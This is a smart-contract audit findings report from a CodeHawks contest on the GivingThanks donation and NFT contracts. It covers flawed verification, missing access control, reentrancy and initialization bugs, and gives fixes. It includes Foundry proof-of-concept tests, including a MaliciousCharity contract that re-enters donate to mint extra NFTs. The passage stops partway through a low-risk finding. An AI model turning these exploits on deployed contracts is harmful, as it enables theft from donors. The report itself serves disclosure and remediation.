# GivingThanks - Findings Report

# Table of contents
- ### [Contest Summary](#contest-summary)
- ### [Results Summary](#results-summary)
- ## High Risk Findings
    - [H-01. Unverified Charities Can Receive Donations Due to Incorrect Verification Logic](#H-01)
    - [H-02. Missing Access Control in updateRegistry Function](#H-02)
- ## Medium Risk Findings
    - [M-01. Incorrect Initialization of `registry` in `GivingThanks` Contract Constructor](#M-01)
    - [M-02. Reentrancy in NFT Minting allows Multiple NFTs for Single Donation in GivingThanks.sol](#M-02)
    - [M-03. Missing Registry Removal Functionality in `CharityRegistry.sol`](#M-03)
- ## Low Risk Findings
    - [L-01. Users can get NFTs sending zero transactions.](#L-01)
    - [L-02. GivingThanks.donate(): Minitg unlimited number of NFT tokens by charity](#L-02)


# <a id='contest-summary'></a>Contest Summary

### Sponsor: First Flight #28

### Dates: Nov 7th, 2024 - Nov 14th, 2024

[See more contest details here](https://codehawks.cyfrin.io/c/2024-11-giving-thanks)

# <a id='results-summary'></a>Results Summary

### Number of findings:
   - High: 2
   - Medium: 3
   - Low: 2


# High Risk Findings

## <a id='H-01'></a>H-01. Unverified Charities Can Receive Donations Due to Incorrect Verification Logic

_Submitted by [PureSecurity](https://codehawks.cyfrin.io/team/cm0moh5vt000c9pircz49r3il), [blacksquirrel](https://profiles.cyfrin.io/u/undefined), [jumpupjoran](https://profiles.cyfrin.io/u/undefined), [koinerdegen](https://profiles.cyfrin.io/u/undefined), [ssalaudeen10](https://profiles.cyfrin.io/u/undefined), [dustinhuel2](https://profiles.cyfrin.io/u/undefined), [newspacexyz](https://profiles.cyfrin.io/u/undefined), [sstoqnov_](https://profiles.cyfrin.io/u/undefined), [ghufranhassan1](https://profiles.cyfrin.io/u/undefined), [icon0x](https://profiles.cyfrin.io/u/undefined), [somasine](https://profiles.cyfrin.io/u/undefined), [simsecurity](https://profiles.cyfrin.io/u/undefined), [nap23](https://profiles.cyfrin.io/u/undefined), [gopiinho](https://profiles.cyfrin.io/u/undefined), [kalodfreelancer](https://profiles.cyfrin.io/u/undefined), [vabs10](https://profiles.cyfrin.io/u/undefined), [k3ysk1lls](https://profiles.cyfrin.io/u/undefined), [phylax](https://profiles.cyfrin.io/u/undefined), [victortheoracle](https://profiles.cyfrin.io/u/undefined), [nurayko](https://profiles.cyfrin.io/u/undefined), [cryptos](https://profiles.cyfrin.io/u/undefined), [chrissavov](https://profiles.cyfrin.io/u/undefined), [joseph_nwodoh](https://profiles.cyfrin.io/u/undefined), [abhishekthakur](https://profiles.cyfrin.io/u/undefined), [0xnelli](https://profiles.cyfrin.io/u/undefined), [rahim7x](https://profiles.cyfrin.io/u/undefined), [yuza101](https://profiles.cyfrin.io/u/undefined), [bryanconquer](https://profiles.cyfrin.io/u/undefined), [iepathos](https://profiles.cyfrin.io/u/undefined), [4rdiii](https://profiles.cyfrin.io/u/undefined), [mishraji874](https://profiles.cyfrin.io/u/undefined), [nikbhintade](https://profiles.cyfrin.io/u/undefined), [ahmedovv123](https://profiles.cyfrin.io/u/undefined), [falde](https://profiles.cyfrin.io/u/undefined), [ihakmi](https://profiles.cyfrin.io/u/undefined), [al88nsk](https://profiles.cyfrin.io/u/undefined), [ashishlach](https://profiles.cyfrin.io/u/undefined), [trashpirate](https://profiles.cyfrin.io/u/undefined), [mo_](https://profiles.cyfrin.io/u/undefined), [kobbyeugene](https://profiles.cyfrin.io/u/undefined), [adamn](https://profiles.cyfrin.io/u/undefined), [0xgondar](https://profiles.cyfrin.io/u/undefined), [austriandev](https://profiles.cyfrin.io/u/undefined), [spidy7301](https://profiles.cyfrin.io/u/undefined), [vincent71399](https://profiles.cyfrin.io/u/undefined), [bowtiedharpyeagle](https://profiles.cyfrin.io/u/undefined), [null](https://profiles.cyfrin.io/u/undefined), [0xshuayb](https://profiles.cyfrin.io/u/undefined), [dod4ufn](https://profiles.cyfrin.io/u/undefined), [delinked](https://profiles.cyfrin.io/u/undefined), [solgoodman](https://profiles.cyfrin.io/u/undefined), [murelel](https://profiles.cyfrin.io/u/undefined), [m3dython](https://profiles.cyfrin.io/u/undefined), [soupy](https://profiles.cyfrin.io/u/undefined), [joaosantosjorge](https://profiles.cyfrin.io/u/undefined), [ansazanjbeel](https://profiles.cyfrin.io/u/undefined), [0xalex](https://profiles.cyfrin.io/u/undefined), [n3smaro](https://profiles.cyfrin.io/u/undefined), [howiecht](https://profiles.cyfrin.io/u/undefined), [peterson](https://profiles.cyfrin.io/u/undefined), [jporter](https://profiles.cyfrin.io/u/undefined), [faisalali19](https://profiles.cyfrin.io/u/undefined), [5an1tyb0y](https://profiles.cyfrin.io/u/undefined), [predator](https://profiles.cyfrin.io/u/undefined), [cosmostx7](https://profiles.cyfrin.io/u/undefined), [bbash](https://profiles.cyfrin.io/u/undefined), [oluwaseyisekoni](https://profiles.cyfrin.io/u/undefined), [architect](https://profiles.cyfrin.io/u/undefined), [xilobytes](https://profiles.cyfrin.io/u/undefined), [edmpulasky](https://profiles.cyfrin.io/u/undefined), [elminnyc](https://profiles.cyfrin.io/u/undefined), [modey](https://profiles.cyfrin.io/u/undefined), [zhanmingjing](https://profiles.cyfrin.io/u/undefined), [yowisec](https://profiles.cyfrin.io/u/0xodus), [0xodus](https://profiles.cyfrin.io/u/undefined), [linmiaomiao](https://profiles.cyfrin.io/u/undefined). Selected submission by: [chrissavov](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

The `GivingThanks` contract allows donations to charities that are registered but not verified, bypassing the intended `verifyCharity` requirement. This occurs due to a logic flaw in the `isVerified` function in `CharityRegistry`, which incorrectly checks the `registeredCharities` mapping instead of `verifiedCharities`.

## Vulnerability Details

1. **Root Cause**: In the `GivingThanks` contract, the `donate` function checks charity verification status via `registry.isVerified(charity)`. However, in `CharityRegistry`, the `isVerified` function returns `true` for any registered charity, even if it’s not verified.
2. **Expected Behavior**: Only charities that are both registered and verified should pass the `isVerified` check in `donate`.
3. **Current Behavior**: Any registered charity (even unverified ones) will pass the `isVerified` check, allowing donations to potentially untrusted recipients.

## Impact

This vulnerability enables donations to charities that have not been vetted by the intended `verifyCharity` process, undermining the verification requirement and allowing unverified charities to receive funds. This could lead to potential misallocation of donated funds or abuse by malicious actors registering as charities without undergoing verification.

## Tools Used

Manual code review, Foundry

## Recommendations

1. **Update `isVerified` Logic**: Modify `isVerified` in `CharityRegistry` to return `true` only if the charity is verified by checking `verifiedCharities[charity]`:
   ```diff
   function isVerified(address charity) public view returns (bool) {
   -   return registeredCharities[charity];
   +   return verifiedCharities[charity];
   }
   ```

## POC

Running the line `forge test -mt testCannotDonateToUnverifiedCharity` with the following set up and test functions:

```solidity
 function setUp() public {
     // Initialize addresses
     admin = makeAddr("admin");
     charity = makeAddr("charity");
     donor = makeAddr("donor");

     // Deploy the CharityRegistry contract as admin
     vm.prank(admin);
     registryContract = new CharityRegistry();

     // Deploy the GivingThanks contract by making it appear as if CharityRegistry is the deployer
     vm.prank(address(registryContract));
     charityContract = new GivingThanks(address(registryContract));

     // Register and verify the charity
     vm.prank(admin);
     registryContract.registerCharity(charity);

     vm.prank(admin);
     registryContract.verifyCharity(charity);
 }

 function testCannotDonateToUnverifiedCharity() public {
     address unverifiedCharity = address(0x4);

     // Unverified charity registers but is not verified
     vm.prank(unverifiedCharity);
     registryContract.registerCharity(unverifiedCharity);

     // Fund the donor
     vm.deal(donor, 10 ether);

     // Donor tries to donate to unverified charity
     vm.prank(donor);
     vm.expectRevert();
     charityContract.donate{value: 1 ether}(unverifiedCharity);
 }   
```

will output

```Solidity
Ran 1 test for test/GivingThanks.t.sol:GivingThanksTest
[FAIL: next call did not revert as expected] testCannotDonateToUnverifiedCharity() (gas: 307609)
Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 923.48µs (243.06µs CPU time)
```

This test demonstrates that a donor may make a donation to a unregistered charity.

## <a id='H-02'></a>H-02. Missing Access Control in updateRegistry Function

_Submitted by [strongpeach398](https://profiles.cyfrin.io/u/undefined), [i_atiq](https://profiles.cyfrin.io/u/undefined), [PureSecurity](https://codehawks.cyfrin.io/team/cm0moh5vt000c9pircz49r3il), [koinerdegen](https://profiles.cyfrin.io/u/undefined), [modey](https://profiles.cyfrin.io/u/undefined), [jumpupjoran](https://profiles.cyfrin.io/u/undefined), [ssalaudeen10](https://profiles.cyfrin.io/u/undefined), [hawks](https://profiles.cyfrin.io/u/undefined), [dustinhuel2](https://profiles.cyfrin.io/u/undefined), [conveloxy](https://profiles.cyfrin.io/u/undefined), [eth0x](https://profiles.cyfrin.io/u/undefined), [cyberfalcon](https://profiles.cyfrin.io/u/undefined), [sauronsol](https://profiles.cyfrin.io/u/undefined), [icon0x](https://profiles.cyfrin.io/u/undefined), [somasine](https://profiles.cyfrin.io/u/undefined), [levi678](https://profiles.cyfrin.io/u/undefined), [simsecurity](https://profiles.cyfrin.io/u/undefined), [kalodfreelancer](https://profiles.cyfrin.io/u/undefined), [k3ysk1lls](https://profiles.cyfrin.io/u/undefined), [ghufranhassan1](https://profiles.cyfrin.io/u/undefined), [victortheoracle](https://profiles.cyfrin.io/u/undefined), [abhishekthakur](https://profiles.cyfrin.io/u/undefined), [cryptos](https://profiles.cyfrin.io/u/undefined), [rahim7x](https://profiles.cyfrin.io/u/undefined), [bryanconquer](https://profiles.cyfrin.io/u/undefined), [faisalali19](https://profiles.cyfrin.io/u/undefined), [chrissavov](https://profiles.cyfrin.io/u/undefined), [0xnelli](https://profiles.cyfrin.io/u/undefined), [iepathos](https://profiles.cyfrin.io/u/undefined), [freesultan](https://profiles.cyfrin.io/u/undefined), [1405269390](https://profiles.cyfrin.io/u/undefined), [4rdiii](https://profiles.cyfrin.io/u/undefined), [mishraji874](https://profiles.cyfrin.io/u/undefined), [nikbhintade](https://profiles.cyfrin.io/u/undefined), [blaze](https://profiles.cyfrin.io/u/undefined), [ahmedovv123](https://profiles.cyfrin.io/u/undefined), [falde](https://profiles.cyfrin.io/u/undefined), [ihakmi](https://profiles.cyfrin.io/u/undefined), [al88nsk](https://profiles.cyfrin.io/u/undefined), [ashishlach](https://profiles.cyfrin.io/u/undefined), [trashpirate](https://profiles.cyfrin.io/u/undefined), [mo_](https://profiles.cyfrin.io/u/undefined), [0xgondar](https://profiles.cyfrin.io/u/undefined), [austriandev](https://profiles.cyfrin.io/u/undefined), [null](https://profiles.cyfrin.io/u/undefined), [dod4ufn](https://profiles.cyfrin.io/u/undefined), [adamn](https://profiles.cyfrin.io/u/undefined), [solgoodman](https://profiles.cyfrin.io/u/undefined), [murelel](https://profiles.cyfrin.io/u/undefined), [m3dython](https://profiles.cyfrin.io/u/undefined), [phylax](https://profiles.cyfrin.io/u/undefined), [agrimsharma](https://profiles.cyfrin.io/u/undefined), [viquetoh](https://profiles.cyfrin.io/u/undefined), [soupy](https://profiles.cyfrin.io/u/undefined), [0xalex](https://profiles.cyfrin.io/u/undefined), [n3smaro](https://profiles.cyfrin.io/u/undefined), [safiullahmubashir08](https://profiles.cyfrin.io/u/undefined), [peterson](https://profiles.cyfrin.io/u/undefined), [jporter](https://profiles.cyfrin.io/u/undefined), [delinked](https://profiles.cyfrin.io/u/undefined), [cosmostx7](https://profiles.cyfrin.io/u/undefined), [affanimran1303](https://profiles.cyfrin.io/u/undefined), [5an1tyb0y](https://profiles.cyfrin.io/u/undefined), [predator](https://profiles.cyfrin.io/u/undefined), [bbash](https://profiles.cyfrin.io/u/undefined), [oluwaseyisekoni](https://profiles.cyfrin.io/u/undefined), [delvine](https://profiles.cyfrin.io/u/undefined), [blacksquirrel](https://profiles.cyfrin.io/u/undefined), [architect](https://profiles.cyfrin.io/u/undefined), [edmpulasky](https://profiles.cyfrin.io/u/undefined), [azleal](https://profiles.cyfrin.io/u/undefined), [howiecht](https://profiles.cyfrin.io/u/undefined), [imdheeraj28](https://profiles.cyfrin.io/u/undefined), [zhanmingjing](https://profiles.cyfrin.io/u/undefined), [elminnyc](https://profiles.cyfrin.io/u/undefined), [parmakhanm786](https://profiles.cyfrin.io/u/undefined), [linmiaomiao](https://profiles.cyfrin.io/u/undefined), [ansazanjbeel](https://profiles.cyfrin.io/u/undefined), [poink](https://profiles.cyfrin.io/u/undefined). Selected submission by: [sauronsol](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

The updateRegistry function lacks access control, allowing any address to change the charity registry address, effectively compromising the entire donation system.

## Vulnerability Details

```solidity
function updateRegistry(address _registry) public {  // No access control
    registry = CharityRegistry(_registry);
}
```

Test demonstrating vulnerability:
```solidity
function testUpdateRegistryNoAccessControl() public {
    address attacker = makeAddr("attacker");
    address maliciousRegistry = makeAddr("maliciousRegistry");
    
    vm.startPrank(attacker);
    charityContract.updateRegistry(maliciousRegistry);
    assertEq(address(charityContract.registry()), maliciousRegistry);
    vm.stopPrank();
}
```

## Impact

HIGH severity:

- Any address can change the registry
- Attacker can point to malicious registry that validates fake charities
- Complete compromise of donation verification system
- Potential theft of donations through fake charities

## Tools Used

- Manual code review
- Foundry testing framework
- Custom access control test

## Recommendations

1. Add Ownable pattern:

```solidity
contract GivingThanks is ERC721URIStorage, Ownable {
    function updateRegistry(address _registry) public onlyOwner {
        require(_registry != address(0), "Invalid registry address");
        registry = CharityRegistry(_registry);
    }
}
```

2. Or implement role-based access control:

```solidity
contract GivingThanks is ERC721URIStorage, AccessControl {
    bytes32 public constant ADMIN_ROLE = keccak256("ADMIN_ROLE");

    constructor() {
        _grantRole(ADMIN_ROLE, msg.sender);
    }

    function updateRegistry(address _registry) public onlyRole(ADMIN_ROLE) {
        require(_registry != address(0), "Invalid registry address");
        registry = CharityRegistry(_registry);
    }
}
```

# Medium Risk Findings

## <a id='M-01'></a>M-01. Incorrect Initialization of `registry` in `GivingThanks` Contract Constructor

_Submitted by [i_atiq](https://profiles.cyfrin.io/u/undefined), [PureSecurity](https://codehawks.cyfrin.io/team/cm0moh5vt000c9pircz49r3il), [koinerdegen](https://profiles.cyfrin.io/u/undefined), [jumpupjoran](https://profiles.cyfrin.io/u/undefined), [somasine](https://profiles.cyfrin.io/u/undefined), [ssalaudeen10](https://profiles.cyfrin.io/u/undefined), [hawks](https://profiles.cyfrin.io/u/undefined), [dustinhuel2](https://profiles.cyfrin.io/u/undefined), [eth0x](https://profiles.cyfrin.io/u/undefined), [icon0x](https://profiles.cyfrin.io/u/undefined), [levi678](https://profiles.cyfrin.io/u/undefined), [simsecurity](https://profiles.cyfrin.io/u/undefined), [nap23](https://profiles.cyfrin.io/u/undefined), [spidy7301](https://profiles.cyfrin.io/u/undefined), [kalodfreelancer](https://profiles.cyfrin.io/u/undefined), [shahid](https://profiles.cyfrin.io/u/undefined), [k3ysk1lls](https://profiles.cyfrin.io/u/undefined), [ghufranhassan1](https://profiles.cyfrin.io/u/undefined), [victortheoracle](https://profiles.cyfrin.io/u/undefined), [joseph_nwodoh](https://profiles.cyfrin.io/u/undefined), [sala1](https://profiles.cyfrin.io/u/undefined), [nurayko](https://profiles.cyfrin.io/u/undefined), [abhishekthakur](https://profiles.cyfrin.io/u/undefined), [0xnelli](https://profiles.cyfrin.io/u/undefined), [freesultan](https://profiles.cyfrin.io/u/undefined), [bryanconquer](https://profiles.cyfrin.io/u/undefined), [mo_](https://profiles.cyfrin.io/u/undefined), [faisalali19](https://profiles.cyfrin.io/u/undefined), [iepathos](https://profiles.cyfrin.io/u/undefined), [0xodus](https://profiles.cyfrin.io/u/undefined), [4rdiii](https://profiles.cyfrin.io/u/undefined), [mishraji874](https://profiles.cyfrin.io/u/undefined), [blaze](https://profiles.cyfrin.io/u/undefined), [nikbhintade](https://profiles.cyfrin.io/u/undefined), [stevenodiba20](https://profiles.cyfrin.io/u/undefined), [ihakmi](https://profiles.cyfrin.io/u/undefined), [ashishlach](https://profiles.cyfrin.io/u/undefined), [kobbyeugene](https://profiles.cyfrin.io/u/undefined), [adamn](https://profiles.cyfrin.io/u/undefined), [0xgondar](https://profiles.cyfrin.io/u/undefined), [phylax](https://profiles.cyfrin.io/u/undefined), [davidjohn241018](https://profiles.cyfrin.io/u/undefined), [austriandev](https://profiles.cyfrin.io/u/undefined), [vincent71399](https://profiles.cyfrin.io/u/undefined), [yuza101](https://profiles.cyfrin.io/u/undefined), [zyrrow](https://profiles.cyfrin.io/u/undefined), [null](https://profiles.cyfrin.io/u/undefined), [dod4ufn](https://profiles.cyfrin.io/u/undefined), [trashpirate](https://profiles.cyfrin.io/u/undefined), [agrimsharma](https://profiles.cyfrin.io/u/undefined), [solgoodman](https://profiles.cyfrin.io/u/undefined), [murelel](https://profiles.cyfrin.io/u/undefined), [m3dython](https://profiles.cyfrin.io/u/undefined), [soupy](https://profiles.cyfrin.io/u/undefined), [joaosantosjorge](https://profiles.cyfrin.io/u/undefined), [0xalex](https://profiles.cyfrin.io/u/undefined), [falde](https://profiles.cyfrin.io/u/undefined), [safiullahmubashir08](https://profiles.cyfrin.io/u/undefined), [jporter](https://profiles.cyfrin.io/u/undefined), [delinked](https://profiles.cyfrin.io/u/undefined), [peterson](https://profiles.cyfrin.io/u/undefined), [cosmostx7](https://profiles.cyfrin.io/u/undefined), [affanimran1303](https://profiles.cyfrin.io/u/undefined), [5an1tyb0y](https://profiles.cyfrin.io/u/undefined), [predator](https://profiles.cyfrin.io/u/undefined), [bbash](https://profiles.cyfrin.io/u/undefined), [oluwaseyisekoni](https://profiles.cyfrin.io/u/undefined), [architect](https://profiles.cyfrin.io/u/undefined), [delvine](https://profiles.cyfrin.io/u/undefined), [blacksquirrel](https://profiles.cyfrin.io/u/undefined), [xilobytes](https://profiles.cyfrin.io/u/undefined), [edmpulasky](https://profiles.cyfrin.io/u/undefined), [azleal](https://profiles.cyfrin.io/u/undefined), [imdheeraj28](https://profiles.cyfrin.io/u/undefined), [zhanmingjing](https://profiles.cyfrin.io/u/undefined), [howiecht](https://profiles.cyfrin.io/u/undefined), [parmakhanm786](https://profiles.cyfrin.io/u/undefined), [linmiaomiao](https://profiles.cyfrin.io/u/undefined). Selected submission by: [spidy7301](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

In the `GivingThanks` contract, the `registry` variable is incorrectly initialized to `msg.sender` instead of the `_registry` parameter passed to the constructor. This results in the `registry` pointing to the address of the contract deployer rather than the intended `CharityRegistry` contract.

## Vulnerability Details

The vulnerability is an **Initialization Error** located in the constructor of the `GivingThanks` contract. The issue arises from the incorrect assignment of the `registry` variable. Instead of being initialized with the `_registry` parameter, which is intended to be the address of a `CharityRegistry` contract, it is mistakenly set to `msg.sender`. This oversight causes the `registry` to point to the deployer's address rather than the correct `CharityRegistry` contract, leading to the malfunction of critical functionalities such as charity verification and donation processing.

```Solidity
constructor(address _registry) ERC721("DonationReceipt", "DRC") {
    registry = CharityRegistry(msg.sender);
    owner = msg.sender;
    tokenCounter = 0;
}
```

### POC

```Solidity
    function testDonate() public {
        uint256 donationAmount = 1 ether;

        // Check initial token counter
        uint256 initialTokenCounter = charityContract.tokenCounter();

        // Fund the donor
        vm.deal(donor, 10 ether);

        // Donor donates to the charity
        vm.prank(donor);
        charityContract.donate{value: donationAmount}(charity);

        // Check that the NFT was minted
        uint256 newTokenCounter = charityContract.tokenCounter();
        assertEq(newTokenCounter, initialTokenCounter + 1);

        // Verify ownership of the NFT
        address ownerOfToken = charityContract.ownerOf(initialTokenCounter);
        assertEq(ownerOfToken, donor);

        // Verify that the donation was sent to the charity
        uint256 charityBalance = charity.balance;
        assertEq(charityBalance, donationAmount);
    }
```
**Output**

**Test with `registry = CharityRegistry(msg.sender);`**


```Solidity
Ran 1 test for test/GivingThanks.t.sol:GivingThanksTest
[FAIL. Reason: EvmError: Revert] testDonate() (gas: 27751)
Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 4.75ms (544.30µs CPU time)

Ran 1 test suite in 63.27ms (4.75ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/GivingThanks.t.sol:GivingThanksTest
[FAIL. Reason: EvmError: Revert] testDonate() (gas: 27751)

Encountered a total of 1 failing tests, 0 tests succeeded

```

**Test with `registry = CharityRegistry(_registry);`**

```Solidity
Ran 1 test for test/GivingThanks.t.sol:GivingThanksTest
[PASS] testDonate() (gas: 293401)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 7.31ms (1.54ms CPU time)

Ran 1 test suite in 67.92ms (7.31ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

## Impact

* The contract will not function as intended since the `registry` will not point to a valid `CharityRegistry` contract.
* The `donate` function will always fail the `require(registry.isVerified(charity), "Charity not verified")` check, as the `isVerified` function will not be callable on a non-`CharityRegistry` address.

## Tools Used

Manual Code Review and Foundry Unit Test

## Recommendations

Modify the constructor to correctly initialize the `registry` variable with the `_registry` parameter:

```Solidity
    constructor(address _registry) ERC721("DonationReceipt", "DRC") {
        registry = CharityRegistry(_registry);
        owner = msg.sender;
        tokenCounter = 0;
    }
```

## <a id='M-02'></a>M-02. Reentrancy in NFT Minting allows Multiple NFTs for Single Donation in GivingThanks.sol

_Submitted by [strongpeach398](https://profiles.cyfrin.io/u/undefined), [nomadic_bear](https://profiles.cyfrin.io/u/undefined), [koinerdegen](https://profiles.cyfrin.io/u/undefined), [newspacexyz](https://profiles.cyfrin.io/u/undefined), [dustinhuel2](https://profiles.cyfrin.io/u/undefined), [sauronsol](https://profiles.cyfrin.io/u/undefined), [simsecurity](https://profiles.cyfrin.io/u/undefined), [ghufranhassan1](https://profiles.cyfrin.io/u/undefined), [nurayko](https://profiles.cyfrin.io/u/undefined), [iepathos](https://profiles.cyfrin.io/u/undefined), [mishraji874](https://profiles.cyfrin.io/u/undefined), [vincent71399](https://profiles.cyfrin.io/u/undefined), [m3dython](https://profiles.cyfrin.io/u/undefined), [agrimsharma](https://profiles.cyfrin.io/u/undefined), [yuza101](https://profiles.cyfrin.io/u/undefined), [predator](https://profiles.cyfrin.io/u/undefined), [affanimran1303](https://profiles.cyfrin.io/u/undefined), [edmpulasky](https://profiles.cyfrin.io/u/undefined). Selected submission by: [nomadic_bear](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

A high severity vulnerability was identified in the GivingThanks.sol contract where the donate() function is vulnerable to reentrancy attacks. This allows malicious actors to mint multiple NFTs with a single donation amount, breaking the core accounting system of the donation platform.

## Vulnerability Details

The vulnerability exists in the following code section:

```Solidity
function donate(address charity) public payable {
    require(registry.isVerified(charity), "Charity not verified");
    (bool sent,) = charity.call{value: msg.value}("");
    require(sent, "Failed to send Ether");
    // State changes after external call
    _mint(msg.sender, tokenCounter);
    string memory uri = _createTokenURI(msg.sender, block.timestamp, msg.value);
    _setTokenURI(tokenCounter, uri);
    tokenCounter += 1;
}
```

The issue stems from:

&#x20;

1. State changes occurring after the external call to the charity
2. Missing reentrancy protection
3. No application of the checks-effects-interactions pattern

A malicious charity contract can exploit this by:

1. Receiving the initial donation call
2. Using its receive/fallback function to re-enter the donate function
3. Repeating this process multiple times with the same ETH
4. Getting multiple NFTs minted for a single donation amount

## Impact

Through the successful proof of concept, we demonstrated that:

&#x20;

1. A single 1 ETH donation can mint 3 NFTs (original + 2 reentrant calls)
2. The cost per NFT is reduced to 0.33 ETH instead of 1 ETH
3. Multiple donation receipts are created for the same donation
4. The integrity of the donation tracking system is compromised



## Proof of Concept

The following test demonstrates the vulnerability:

```Solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/GivingThanks.sol";
import "../src/CharityRegistry.sol";
import "@openzeppelin/contracts/utils/Strings.sol";
import "@openzeppelin/contracts/utils/Base64.sol";

contract MaliciousCharity {
    GivingThanks private immutable givingThanks;
    uint256 public attackCount;
    uint256 public constant ATTACK_ROUNDS = 2;
    address public owner;

    constructor(address _givingThanks) {
        givingThanks = GivingThanks(_givingThanks);
        owner = msg.sender;
    }

    receive() external payable {
        if (attackCount < ATTACK_ROUNDS) {
            attackCount++;
            // Forward the same ETH back in a reentrant call
            givingThanks.donate{value: msg.value}(address(this));
        }
    }

    function withdrawEth() external {
        require(msg.sender == owner, "Not owner");
        (bool success, ) = payable(owner).call{value: address(this).balance}("");
        require(success, "Transfer failed");
    }

    function getAttackRounds() public pure returns (uint256) {
        return ATTACK_ROUNDS;
    }
}

contract GivingThanksTest is Test {
    GivingThanks public charityContract;
    CharityRegistry public registryContract;
    MaliciousCharity public maliciousCharity;
    
    address public admin;
    address public donor;
    uint256 public constant DONATION_AMOUNT = 1 ether;

    receive() external payable {}

    function setUp() public {
        admin = makeAddr("admin");
        donor = makeAddr("donor");

        vm.startPrank(admin);
        registryContract = new CharityRegistry();
        charityContract = new GivingThanks(address(registryContract));
        vm.stopPrank();

        vm.startPrank(donor);
        maliciousCharity = new MaliciousCharity(address(charityContract));
        vm.stopPrank();

        vm.startPrank(admin);
        registryContract.registerCharity(address(maliciousCharity));
        registryContract.verifyCharity(address(maliciousCharity));
        charityContract.updateRegistry(address(registryContract));
        vm.stopPrank();
    }

    function testReentrancyNFTExploit() public {
        // Fund the donor
        vm.deal(donor, DONATION_AMOUNT);
        
        uint256 initialTokenCounter = charityContract.tokenCounter();
        
        console.log("Initial token counter:", initialTokenCounter);
        console.log("Initial donor ETH:", DONATION_AMOUNT);
        
        // Perform the attack
        vm.startPrank(donor);
        charityContract.donate{value: DONATION_AMOUNT}(address(maliciousCharity));
        vm.stopPrank();
        
        uint256 finalTokenCounter = charityContract.tokenCounter();
        
        console.log("Final token counter:", finalTokenCounter);
        console.log("Total NFTs minted:", finalTokenCounter - initialTokenCounter);
        console.log("ETH spent per NFT:", DONATION_AMOUNT / (finalTokenCounter - initialTokenCounter));
        
        // Verify exploit results
        assertEq(
            finalTokenCounter,
            initialTokenCounter + maliciousCharity.getAttackRounds() + 1,
            "Multiple NFTs should be minted with single ETH payment"
        );

        // Verify all NFTs were minted to the donor or malicious contract
        for (uint256 i = 0; i < maliciousCharity.getAttackRounds() + 1; i++) {
            address owner = charityContract.ownerOf(initialTokenCounter + i);
            assertTrue(
                owner == donor || owner == address(maliciousCharity),
                "NFT should be owned by donor or malicious contract"
            );
        }

        // Verify we used the same ETH multiple times
        assertEq(
            finalTokenCounter - initialTokenCounter,
            maliciousCharity.getAttackRounds() + 1,
            "Should mint multiple NFTs for single ETH payment"
        );
    }
}
```

```diff
Ran 1 test for test/GivingThanksReentrancy.t.sol:GivingThanksTest
[PASS] testReentrancyNFTExploit() (gas: 727715)
Logs:
  Initial token counter: 0
  Initial donor ETH: 1000000000000000000
  Final token counter: 3
  Total NFTs minted: 3
  ETH spent per NFT: 333333333333333333

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.22ms (480.66µs CPU time)

Ran 1 test suite in 5.47ms (1.22ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

## Tools Used

slither . 

Manual review

&#x20;

Foundry test framework

## Recommendations

Implement the checks-effects-interactions pattern:

```Solidity
function donate(address charity) public payable {
    require(registry.isVerified(charity), "Charity not verified");
    
    // Effects before interactions
    uint256 currentTokenId = tokenCounter++;
    _mint(msg.sender, currentTokenId);
    string memory uri = _createTokenURI(msg.sender, block.timestamp, msg.value);
    _setTokenURI(currentTokenId, uri);
    
    // Interactions last
    (bool sent,) = charity.call{value: msg.value}("");
    require(sent, "Failed to send Ether");
}
```

Add OpenZeppelin's ReentrancyGuard:

```Solidity
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract GivingThanks is ReentrancyGuard {
    function donate(address charity) public payable nonReentrant {
        ...
    }
}
```

## <a id='M-03'></a>M-03. Missing Registry Removal Functionality in `CharityRegistry.sol`

_Submitted by [newspacexyz](https://profiles.cyfrin.io/u/undefined), [dustinhuel2](https://profiles.cyfrin.io/u/undefined), [iepathos](https://profiles.cyfrin.io/u/undefined), [mishraji874](https://profiles.cyfrin.io/u/undefined). Selected submission by: [mishraji874](https://profiles.cyfrin.io/u/undefined)._      
            


**Description**: The contract lacks functionality to remove registered or verified charities, making it impossible to handle compromised or defunct charities.

**Impact**:

* No way to remove malicious charities
* Cannot update registry for defunct organizations
* Permanent storage bloat
* No ability to handle compromised charity addresses

**Recommended Mitigation**: Add functions to remove charities with appropriate access controls.

```solidity
event CharityRemoved(address indexed charity);

function removeCharity(address charity) public onlyAdmin {
    require(registeredCharities[charity], "Charity not registered");
    registeredCharities[charity] = false;
    verifiedCharities[charity] = false;
    emit CharityRemoved(charity);
}
```


# Low Risk Findings

## <a id='L-01'></a>L-01. Users can get NFTs sending zero transactions.

_Submitted by [eth0x](https://profiles.cyfrin.io/u/undefined), [ssalaudeen10](https://profiles.cyfrin.io/u/undefined), [somasine](https://profiles.cyfrin.io/u/undefined), [simsecurity](https://profiles.cyfrin.io/u/undefined), [hawks](https://profiles.cyfrin.io/u/undefined), [nap23](https://profiles.cyfrin.io/u/undefined), [bryanconquer](https://profiles.cyfrin.io/u/undefined), [falde](https://profiles.cyfrin.io/u/undefined), [4rdiii](https://profiles.cyfrin.io/u/undefined), [peterson](https://profiles.cyfrin.io/u/undefined), [delinked](https://profiles.cyfrin.io/u/undefined), [architect](https://profiles.cyfrin.io/u/undefined), [blacksquirrel](https://profiles.cyfrin.io/u/undefined), [xilobytes](https://profiles.cyfrin.io/u/undefined). Selected submission by: [blacksquirrel](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

The donate function lacks a `check` for msg.value, allowing users to obtain an NFT by sending a transaction with `zero` ether.

## Vulnerability Details

# Proof of code:

Add this `code` to tests , but as there is a bug in the constructor of the `GivingThanks`contract , fix it before running tests .

```diff
 constructor(address _registry) ERC721("DonationReceipt", "DRC") {
+      registry = CharityRegistry(_registry); 
-      registry = CharityRegistry(_msg.sender);
        owner = msg.sender;
        tokenCounter = 0;
    }
```

